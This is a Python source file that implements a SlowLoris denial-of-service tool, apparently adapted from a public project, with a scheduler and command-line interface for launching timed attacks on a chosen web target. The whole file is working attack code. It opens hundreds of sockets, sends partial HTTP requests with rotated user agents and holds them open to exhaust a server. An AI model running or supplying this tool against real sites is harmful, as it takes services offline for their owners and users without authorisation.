import concurrent.futures
import time

import random
import socket
import ssl

from utils.log import log

import argparse

class Execution():
    def __init__(
            self,
            exec_id,
            target,
            epoch_start,
            epoch_stop,
    ):
        self._id = exec_id
        self._target = target
        self._epoch_start = epoch_start
        self._epoch_stop = epoch_stop

    def id(
            self,
    ):
        return self._id

    def target(
            self,
    ):
        return self._target

    def epoch_start(
            self,
    ):
        return self._epoch_start

    def epoch_stop(
            self,
    ):
        return self._epoch_stop

    def execute(
            self,
    ):
        raise("Not implemented.")

    def kill(
            self,
    ):
        raise("Not implemented.")


class SlowLoris(Execution):
    '''SlowLoris implementation.
    https://github.com/gkbrk/slowloris/blob/master/slowloris.py
    '''

    https = None            # Use https?
    NB_OF_SOCKETS = 250     # Number of sockets to use in the attack
    SLEEP_TIME = 15         # time to sleep between each header sent

    list_of_sockets = []
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    def init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if self.https:
            s = ssl.wrap_socket(s)
            port = 443
        else:
            port = 80

        s.connect((self._target, port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send(
            "User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def init_ok(self):
        return self.https != None

    def check_host(self):
        if self._target.lower().startswith("http://"):
            self.https = False
            self._target = domain=self._target.split("//")[-1].split("/")[0]
            log("Detected HTTP url, using HTTP ATK", "success")
        elif self._target.lower().startswith("https://"):
            self.https = True
            self._target = domain=self._target.split("//")[-1].split("/")[0]
            log("Detected HTTPS url, using HTTPS ATK", "success")
        else:
            if socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM).connect_ex(
                    (self._target, 80)) == 0:
                log("Target {} as port 80 open, using HTTP ATK".format(
                    self._target), "success")
                self.https = False
                return True
            else:
                if socket.socket(
                        socket.AF_INET, socket.SOCK_STREAM).connect_ex(
                        (self._target, 443)) == 0:
                    log("Target {} as port 443 open, using HTTPS ATK".format(
                        self._target), "success")
                    self.https = True
                    return True
                else:
                    log("Target www ports are closed (80 & 443), abort.", "error")
                    return False

    def __init__(
            self,
            exec_id,
            target,
            epoch_start,
            epoch_stop,
    ):
        super(SlowLoris, self).__init__(
            exec_id, target, epoch_start, epoch_stop,
        )
        self._running = False
        self.check_host()

    def execute(
            self,
    ):
        self._running = True
        pi_s = 0
        for i in range(self.NB_OF_SOCKETS):
            try:
                s = self.init_socket()
            except socket.error as e:
                break

            pi = int((i+1)*100/self.NB_OF_SOCKETS)
            if pi - pi_s > 10:
                pi_s = pi
                log (
                    "Connected {}/{} sockets ({}%)".format(i+1,
                    self.NB_OF_SOCKETS, pi),
                    "warning",
                    sameline=True
                )
            self.list_of_sockets.append(s)


        pi = int((i+1)*100/self.NB_OF_SOCKETS)
        if pi == 100:
            outcome = "success"
        else:
            outcome = "error"
        log (
            "Connected {}/{} sockets to {} ({}%)".format(i+1,
            self.NB_OF_SOCKETS, self._target, pi),
            outcome,
        )

        while self._running:
            try:
                log(
                    "Sending keep-alive headers... Socket count: {}".format(
                        len(self.list_of_sockets)), "success"
                )
                for s in list(self.list_of_sockets):
                    try:
                        s.send(
                            "X-a: {}\r\n".format(random.randint(1,
                                                                5000)).encode("utf-8")
                        )
                    except socket.error:
                        self.list_of_sockets.remove(s)

                for _ in range(self.NB_OF_SOCKETS - len(self.list_of_sockets)):
                    try:
                        s = self.init_socket()
                        if s:
                            self.list_of_sockets.append(s)
                    except socket.error as e:
                        break
                time.sleep(self.SLEEP_TIME)
            except Exception as e:
                log("SlowLoris crashed ({})".format(e), "error")
                break

    def kill(
            self,
    ):
        self._running = False


class Trigger():
    def __init__(self):
        self._executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)

        self._running = []
        self._pending = []

        self._op_id = 0

    def register(
            self,
            service,
            target,
            epoch_start,
            epoch_stop,
    ):
        # Ignora di eseguire l'op se epoch è passato a epoch_stop.
        epoch = int(time.time())
        if epoch >= epoch_stop:
            return

        if service in ['www']:
            if service == 'www':
                ex = SlowLoris(self._op_id, target, epoch_start, epoch_stop)
            else:
                assert False


            if ex.init_ok():
                self._op_id += 1
                self._pending += [ex]

                log(
                    "Execution registered: {}/{} {} ({}, {})".format(
                        service, ex.id(), ex.target(),
                        ex.epoch_start(), ex.epoch_stop(),
                    ),
                    "success"
                )
            else:
                log(
                    "Execution NOT registered: {} {} ({}, {})".format(
                        service, ex.target(),
                        ex.epoch_start(), ex.epoch_stop(),
                    ),
                    "error"
                )
        else:
            log("Service not supported: {}".format(service), "warning")

    def loop(
            self,
    ):
        epoch = int(time.time())

        for exc in self._pending:
            if epoch >= exc.epoch_start():
                def execute():
                    exc.execute()

                self._running += [(
                    exc, self._executor.submit(execute),
                )]

                self._pending.remove(exc)

                log("Execution {} started".format(exc.id()), "success")

        for r in self._running:
            if epoch >= r[0].epoch_stop():
                r[0].kill()
                time.sleep(1)

                if r[1].done():
                    log("Execution {} finished".format(r[0].id()), "success")
                    self._running.remove(r)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Manual trigger")

    parser.add_argument(
        '--service',
        type=str,
        default="www",
        help="service to attack",
    )
    parser.add_argument(
        '--target',
        type=str,
        required=True,
        help="target to attack (ex: www.site.com, https://www.site.com/, 10.1.0.1, ...",
    )
    parser.add_argument(
        '--epoch_start',
        type=str,
        required=True,
        help="epoch start of attack (can be 'now')",
    )
    parser.add_argument(
        '--duration',
        type=int,
        required=True,
        help="duration of attack (in seconds)",
    )

    args = parser.parse_args()
    if args.service != 'www':
        log("`service` not supported. Supported values: www.", "error", errcode=-1)

    if args.epoch_start == 'now':
        epoch_start = int(time.time()) + 2
    elif int(args.epoch_start) <= int(time.time()):
        log("`epoch_start` must be in the future, " +
                  "current epoch: {}".format(int(time.time())),
                  'error', errcode=-2)
    else:
        epoch_start = int(args.epoch_start)

    duration = int(args.duration)
    if duration <= 0:
        log("`threshold` must be a positive integer" +
            ", got: {}".format(duration), "error", errcode=-3)

    epoch_stop = epoch_start + int(duration)

    trigger = Trigger()
    trigger.register(args.service, args.target, epoch_start, epoch_stop)

    log("Trigger running", "success")
    try:
        while True:
            trigger.loop()
            time.sleep(5)
    except KeyboardInterrupt:
        pass